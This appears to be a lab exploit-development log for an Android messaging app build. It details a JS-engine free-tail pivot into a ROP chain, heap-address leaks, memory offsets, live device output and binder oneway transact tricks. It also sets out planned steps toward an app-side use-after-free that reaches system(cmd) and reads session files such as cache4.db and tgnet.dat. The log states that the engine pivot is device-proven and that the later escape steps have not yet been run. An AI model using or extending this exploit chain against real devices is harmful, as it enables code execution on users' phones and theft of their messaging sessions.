# Android 73029 — free-tail / block-resident pivot, oneway transacts, lb/bp oracle (2026-11-10)

Status: **the engine-side pivot is device-proven on the restored 73029**; the
binder transacts and the app-side UAF are the next steps. No session claim.

## 0. Delivery note

The Sony was restored to 73029 with
`adb install -r -d lab/artifacts_20261108/escape_host/tg73029.apk` at
18:19:30 (data-preserving; <TG_USERNAME> <CHAT_ID> intact, chat only `/start`).
`free_dump_dev` (`8c2aa1ab…`, 3,509 zlib9) passes again: `SC FREEA/FREEB …
dok=1`, engine alive.

## 1. The free slot is a heap-address leak (device-proven)

`js_free_rt`'s large-block tail (`libtwidget+0x3e92ac…0x3e92c8`) is

```
ldr x8,[x0,#0x40]   ; opaque (page-chosen C)
ldr x2,[x0,#0x10]   ; mf.js_free (page-chosen target)
mov x0,x8           ; x0 = C
mov x1,x19          ; x1 = block-8
...
br  x2              ; tail call, return ignored
```

and the enclosing function contains **no `free@plt`**: with SAVE installed in
the slot, libc `free()` never runs, so the block is a **leak, still allocated
and intact**. The SAVE dump writes `C[8] = x1 = block-8`; the page reads it
with the provider `RD8` — a **heap-address leak**. Live (73029, engine 24008):

```
SC ROOT ok=1 seed=0x74f0a905fc
C=0xb4000076f4e46538 mf=0x74f0ad0894 SC LEAK ok=1 f=11111 int=1 B=0xb400007734e39050
SC STAGE n=41 bad=0 ok=1 t0=0xb400007734e39688 x2=0xb400007734e39958 msg=0xa37312031525446
```

`msg` = `0x0a37312031525446` → LE `46 54 52 31 20 31 37 0a` = `FTR1 17\n`.

## 2. Block-resident context (no page writes to C0)

The 0x4000 block at `B` is patched **word by word with the page's own 8-byte
retarget store** (`FTW`) and read back with `RD8`: 41 words, `bad=0` before
arming. The image holds the RESTORE ctx, slot/object pointers, the
continuation frames and the strings. The disarmed `rt+0x10` is restored
before any other engine free.

Pivot: `rt+0x40 = B+8`, `rt+0x10 = RESTORE`, one 0x1000 free →
`RESTORE(B+8)` → `sp=Q0`, `pc=DISP (BASE+0x3ec09c)` → chain steps.
No engine frame is resumed.

## 3. Stack layout wall and fix (live)

The first 0x2000 layout gave only **2,808 B** clear below `sp`; the
continuation needed **4,072 B** below `sp` (`ctx1` at `−0xFE8`, plus `T1`/
`S1`). `__android_log_print`'s multi-KB frame walked through `T1`/`S1`/`ctx1`,
so `GLIDE → RESTORE(ctx1)` jumped through `0xaaaa…` → wild branch → SIGSYS 18
ms after the first log line.

Fix: block **0x4000**, image at `R+0x000..0x918`, frames at the top
(`Q0=R+0x3d78`, `Q1=+0x80`, `Q2=+0x100`), **13,408 B clear below sp**
(4.8× the fatal frame). Emulator suite I: a 0x1800 B callee frame is absorbed;
a 0x3800 B frame kills the continuation with `FETCH_UNMAPPED pc=0xaaaa…`;
`exit_thread(93)` asserted.

Device proof (engine 24008, same millisecond, no signal, engine/app alive):

```
I/FT_A9 (24008): FT_A9        <- step 0, tag == message (x2 control)
I/FT_A9 (24008): FTR1 17      <- step 1, literal marker
```

## 4. Oneway transacts (host-proven)

`IPCThreadState::transact` with `reply=NULL` is **not** one-way: it branches on
flags bit 0 and otherwise builds a stack fake reply and waits. Setting
`[S+0xa0] = 1` (`TF_ONE_WAY`) lets **one** thread queue
`transact(bp,11,&data11,0,1)` then `transact(bp,12,&data12,0,1)`; the app's
15-thread pool serves them concurrently. Thread map: canvas codes 10/11/12 are
emitted only by `twidget-host`; record 6/7/8/9 only by `widget-record`; the
page's JS thread reaches binder only via `hostCall("intl")` (code 5). The
normal-API route cannot produce the pair (two-way serialisation; `getImageData`
is a stub) — the engine RCE is the missing edge.

## 5. `lb`/`bp` in-block oracle (page ready)

`lab/g1_libbinder_oracle_20261110/poc/ga_lb_oracle_dev.html` — 10,177 B /
**4,043 zlib9** / `a610fd10…`. It is the device-green G-A provider
(`cala_ga_dev_dom_rd8y_min.html`, `0e39df5b…`) with two splices; the compiled
frame multiset is identical to the green page (`varc=24 stack=6 vrefc=22
alloca=656`). It derives `lb` from `ta+libdl+link_map` (ELF/phdr/dynsym/SONAME/
build-id/GOT) and resolves the `BpBinder` in-block:

- `gProcess` = inline `.bss` slot **`lb+0xbeb48`** (not `0xbba30`, which is
  `&kDefaultDriver`);
- `ps+0xc0` is the `VectorImpl` vptr, storage `+0xc8`, count `+0xd0`;
- vtable address point `lb+0xb0460` (`+0x68` remoteBinder, `+0x60`
  localBinder).

Expected marker:
`GA … elf=1 lb=0x… lb_ok=1 lb_src=ta+libdl+link_map ok=1 pok=1 bp=0x… h=…
vptr=0x… st=… bp_ok=… bp_src=inblock|no-bpbinder|no-lb gax=none`.

## 6. Live order and status

1. freetail `leak`/`go` (0x4000): **PASS** (leak/stage + both log lines).
2. oracle page in the **same engine pid** → `lb`, `bp`, `handle`, `vptr`,
   `stability` (`bp_ok=1`).
3. bake the values: `python3 lab/g1_freetail_rop_20261110/src/make_tr_page.py
   --lb <hex> --bp <hex>` → `freetail_tr_dev.html` (TR = `LB+0x54984`;
   parcels 132 B code 11 / 116 B code 12; same 0x4000 layout).
4. run the transact page in the same engine → app-side `0xB0` UAF
   (libhwui 15-instruction window) → `defineImage` (code 4) reclaim →
   `Execute libhwui+0x6e64c0` via static vtable `libhwui+0xa30970` →
   `system(cmd)` → `cache4.db` / `tgnet.dat` / `userconfing.xml`.

Claim boundary: the engine pivot and its continuation are device-proven; the
transacts and the app-side escape are **not** yet run. No session claim.
